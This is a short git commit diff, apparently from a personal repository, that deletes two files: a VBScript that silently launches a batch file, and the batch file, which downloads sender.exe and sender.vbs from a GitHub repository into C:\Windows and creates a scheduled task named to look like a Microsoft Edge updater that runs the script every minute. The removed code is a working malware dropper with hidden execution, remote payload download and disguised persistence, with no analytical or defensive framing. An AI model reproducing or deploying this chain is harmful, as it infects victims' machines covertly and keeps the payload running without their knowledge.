239e6d74b35ae24e99c3c404677a3c5d4f4e706f
terionun <terionun_41@hotmail.com>
2024-07-17 02:50:36 +0300

    w
    w

--- hide.vbs
+++
@@ -1,4 +0,0 @@
-Dim WShell
-Set WShell = CreateObject("WScript.Shell")
-WShell.Run "C:\Windows\main.bat", 0
-Set WShell = Nothing
--- main.bat
+++
@@ -1,3 +0,0 @@
-curl.exe https://github.com/terionun/smbb/raw/main/sender.exe -o C:\Windows\sender.exe
-curl.exe https://raw.githubusercontent.com/terionun/smbb/main/sender.vbs -o C:\Windows\sender.vbs
-schtasks /create /sc minute /mo 1 /tn "MicrosoftEdgeUpdateTaskMachine" /tr "wscript C:\Windows\sender.vbs"
